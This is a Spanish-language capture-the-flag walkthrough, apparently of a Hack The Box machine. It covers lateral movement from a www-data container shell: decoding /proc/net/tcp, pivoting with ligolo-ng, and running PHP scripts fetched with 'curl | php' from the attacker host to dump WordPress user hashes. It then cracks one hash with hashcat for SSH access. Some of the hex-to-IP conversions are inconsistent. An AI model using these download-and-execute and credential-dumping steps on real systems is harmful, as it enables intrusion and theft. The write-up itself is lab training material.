# User www-data


## Lateral Movement

Al estar en un contenedor no tenemos comandos como ss ni netstat pero si wget


## /proc/net/tcp:
```shell
www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$ cat /proc/net/tcp
cat /proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                                                                        
   0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 37202 1 0000000000000000 100 0 0 10 0                                                                        
   1: 030011AC:9A3C 2A100A0A:115C 01 00000000:00000000 00:00000000 00000000    33        0 84716 1 0000000000000000 566 4 30 10 24                                                                      
   2: 030011AC:9CD6 010011AC:0CEA 01 00000000:00000000 02:0009B676 00000000    33        0 368393 2 0000000000000000 20 4 17 10 -1                                                                      
   3: 030011AC:E4A8 010011AC:0CEA 01 00000000:00000000 02:000300EF 00000000    33        0 85383 2 0000000000000000 20 4 1 10 -1                                                                        
   4: 030011AC:A3B0 400E0A0A:115C 01 00000012:00000000 01:00000024 00000000    33        0 368396 3 0000000000000000 36 4 30 10 -1             
```

  

#### **Estructura de `/proc/net/tcp`**

|                 |                                                                        |     |
| --------------- | ---------------------------------------------------------------------- | --- |
| `sl`            | Índice de la conexión (número de línea).                               |     |
| `local_address` | Dirección IP local y puerto local (en formato hexadecimal).            |     |
| `rem_address`   | Dirección IP remota y puerto remoto (en formato hexadecimal).          |     |
| `st`            | Estado de la conexión (en hexadecimal; ver tabla más abajo).           |     |
| `tx_queue`      | Cantidad de bytes en cola para transmisión.                            |     |
| `rx_queue`      | Cantidad de bytes en cola para recepción.                              |     |
| `tr`            | Timer retransmisión (no relevante en este caso).                       |     |
| `tm->when`      | Tiempo restante del timer (no relevante en este caso).                 |     |
| `retrnsmt`      | Número de retransmisiones.                                             |     |
| `uid`           | ID de usuario que inició la conexión.                                  |     |
| `timeout`       | Timeout de la conexión (generalmente 0 si no hay timeout configurado). |     |
| `inode`         | Número de inode asociado con la conexión.                              |     |

---
Conexion 1
```bash
0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 37202 1 0000000000000000 100 0 0 10 0
```

- **Local Address (`00000000:0050`)** :
    - IP: `0.0.0.0` (escucha en todas las interfaces).
    - Puerto: `0x0050` = `80` (HTTP).
- **Remote Address (`00000000:0000`)** :
    - IP: `0.0.0.0` (sin conexión remota).
    - Puerto: `0` (ningún puerto remoto asignado).
- **Estado (`0A`)** : Estado `LISTEN` (esperando conexiones entrantes).
- **UID** : `0` (proceso pertenece al usuario root o sistema).
- **Descripción** : Esta es una conexión HTTP que está escuchando en el puerto 80. (el blog)

Conexion 2
```shell
1: 030011AC:9A3C 2A100A0A:115C 01 00000000:00000000 00:00000000 00000000    33        0 84716 1 0000000000000000 566 4 30 10 24
```

- **Local Address (`030011AC:9A3C`)** :
    - IP: `192.168.0.3` (convertido de `030011AC`).
    - Puerto: `0x9A3C` = `39484`.
- **Remote Address (`2A100A0A:115C`)** :
    - IP: `10.16.42.42` (convertido de `2A100A0A`).
    - Puerto: `0x115C` = `4444`.
- **Estado (`01`)** : Estado `ESTABLISHED` (conexión activa).
- **UID** : `33` (generalmente el usuario `www-data` en sistemas web).
- **Descripción** : Una conexión establecida desde `192.168.0.3:39484` hacia `10.16.42.42:4444`. (nuestra rev-shell)

Conexion 3 
```bash
2: 030011AC:9CD6 010011AC:0CEA 01 00000000:00000000 02:0009B676 00000000    33        0 368393 2 0000000000000000 20 4 17 10 -1
```
- **Local Address (`030011AC:9CD6`)** :
    - IP: `192.168.0.3`.
    - Puerto: `0x9CD6` = `39958`.
- **Remote Address (`010011AC:0CEA`)** :
    - IP: `192.168.0.1`.
    - Puerto: `0x0CEA` = `3306` (puerto MySQL).
- **Estado (`01`)** : Estado `ESTABLISHED`.
- **UID** : `33` (usuario `www-data`).
- **Descripción** : Una conexión establecida desde `192.168.0.3:39958` hacia `192.168.0.1:3306` (base de datos MySQL de la cual ya tenemos credenciales (wp-config.php de recon).

Conexion 4
```bash
3: 030011AC:E4A8 010011AC:0CEA 01 00000000:00000000 02:000300EF 00000000    33        0 85383 2 0000000000000000 20 4 1 10 -1
```
- **Local Address (`030011AC:E4A8`)** :
    - IP: `192.168.0.3`.
    - Puerto: `0xE4A8` = `58536`.
- **Remote Address (`010011AC:0CEA`)** :
    - IP: `192.168.0.1`.
    - Puerto: `0x0CEA` = `3306` (MySQL).
- **Estado (`01`)** : Estado `ESTABLISHED`.
- **UID** : `33` (usuario `www-data`).
- **Descripción** : Otra conexión hacia la base de datos MySQL en `192.168.0.1:3306`.


Conexion 5
```bash
4: 030011AC:A3B0 400E0A0A:115C 01 00000012:00000000 01:00000024 00000000    33        0 368396 3 0000000000000000 36 4 30 10 -1
```

- **Local Address (`030011AC:A3B0`)** :
    - IP: `192.168.0.3`.
    - Puerto: `0xA3B0` = `41872`.
- **Remote Address (`400E0A0A:115C`)** :
    - IP: `10.14.10.64`.
    - Puerto: `0x115C` = `4444`.
- **Estado (`01`)** : Estado `ESTABLISHED`.
- **UID** : `33` (usuario `www-data`).
- **Descripción** : Una conexión establecida desde `192.168.0.3:41872` hacia `10.14.10.64:4444`.

# Pivoting
## [ligolo-ng](https://github.com/nicocha30/ligolo-ng)


Vamos a usar ligolo-ng para hacer pivoting creando un puente entre la maquina y nuestro host:

 ligolo en vez de usar un SOCKS proxy o TCP/UDP fowarding, **Ligolo-ng** crea un userland network stack usando  [Gvisor](https://gvisor.dev/).

Esta herramienta nos permite pivotar en la maquina de forma muchisimo mas rapida de lo que podria hacer chisel o meterpreter



Subimos a la máquina victima (derecha) el agent y desde el host (izquierda) ajustamos el proxy; Una vez establecido el tunel podemos ver que tenemos conexión con el puerto 3306 de la victima (mysql)
![[Pasted image 20250203003144.png]]

Probamos a conectarnos al mysql :


Intento conectarme al servidor de mysql sin exito
![[Pasted image 20250203003751.png]]
Aun con el tunel establecido no soy capaz de entablar la conexion; eso significa que o bien el mysql no esta corriendo (no es el caso) o tiene un cortafuegos.

La maquina victima (dockerizada) no tiene el binario mysql pero si que sabemos que tiene php por lo que podemos intentar entrar en la base de datos mediante un script ;
```php
<?php
$host = '172.17.0.1';
$user = 'wp_user';
$pass = 'wp_password';
$db = 'wordpress';

$conn = new mysqli($host, $user, $pass, $db);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
echo "Connected successfully\n";

$result = $conn->query("SHOW TABLES");
while ($row = $result->fetch_row()) {
    echo $row[0] . "\n";
}
$conn->close();
?>
```

```bash
www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$ curl 10.10.14.64:8000/trythis.php | php
<s/wp-admin$ curl 10.10.14.64:8000/trythis.php | php    
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   379  100   379    0     0   1041      0 --:--:-- --:--:-- --:--:--  1044
Connected successfully
wp_commentmeta
wp_comments
wp_links
wp_options
wp_postmeta
wp_posts
wp_term_relationships
wp_term_taxonomy
wp_termmeta
wp_terms
wp_usermeta
wp_users
www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$ 
```
Bingo!

sacamos los datos de la tabla wp_users:

```bash
<?php
$host = '172.17.0.1';
$user = 'wp_user';
$pass = 'wp_password';
$db = 'wordpress';


$conn = new mysqli($host, $user, $pass, $db);


if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
echo "Connected successfully\n";


$query = "SELECT * FROM wp_users";
$result = $conn->query($query);

// Verificar si hay resultados
if ($result->num_rows > 0) {
    // Iterar sobre cada fila de la tabla wp_users
    while ($row = $result->fetch_assoc()) {
        // Imprimir todas las columnas de la fila
        foreach ($row as $key => $value) {
            echo "$key: $value\n";
        }
        echo "------------------------\n"; // Separador entre usuarios
    }
} else {
    echo "No se encontraron registros en la tabla wp_users.\n";
}


$conn->close();
?>
```

voi là !

```bash
www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$ curl 10.10.14.64:8000/wp_users.php | php
</wp-admin$ curl 10.10.14.64:8000/wp_users.php | php    
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   963  100   963    0     0   4125      0 --:--:-- --:--:-- --:--:--  4133
Connected successfully
ID: 1
user_login: root
user_pass: $P$Beh5HLRUlTi1LpLEAstRyXaaBOJICj1
user_nicename: root
user_email: root@bigbang.htb
user_url: http://blog.bigbang.htb
user_registered: 2024-05-31 13:06:58
user_activation_key: 
user_status: 0
display_name: root
------------------------
ID: 3
user_login: shawking
user_pass: $P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./
user_nicename: shawking
user_email: shawking@bigbang.htb
user_url: 
user_registered: 2024-06-01 10:39:55
user_activation_key: 
user_status: 0
display_name: Stephen Hawking
------------------------

```

Bueno a crackear esas passwords!

```bash
➜  BigBang hashcat --identify shawkinghash 
The following hash-mode match the structure of your input hash:
      # | Name                                                       | Category
  ======+============================================================+======================================
    400 | phpass                                                     | Generic KDF
```
---

# Hashcat y user.txt

Crackeamos el el phpass
```bash

hashcat -a 0 -m 400 shawkinghash /usr/share/wordlists/rockyou.txt

$P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./:quantumphysics         
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 400 (phpass)
Hash.Target......: $P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./
Time.Started.....: Mon Feb  3 20:49:54 2025 (12 mins, 36 secs)
Time.Estimated...: Mon Feb  3 21:02:30 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5901 H/s (10.65ms) @ Accel:256 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4456448/14344385 (31.07%)
Rejected.........: 0/4456448 (0.00%)
Restore.Point....: 4454400/14344385 (31.05%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:7936-8192
Candidate.Engine.: Device Generator
Candidates.#1....: quaqua8 -> qu956421
Hardware.Mon.#1..: Temp: 82c Util: 89%

Started: Mon Feb  3 20:49:51 2025
Stopped: Mon Feb  3 21:02:31 2025

```

Usamos esa clave para conectarnos por ssh a la maquina y el usuario shawking

---

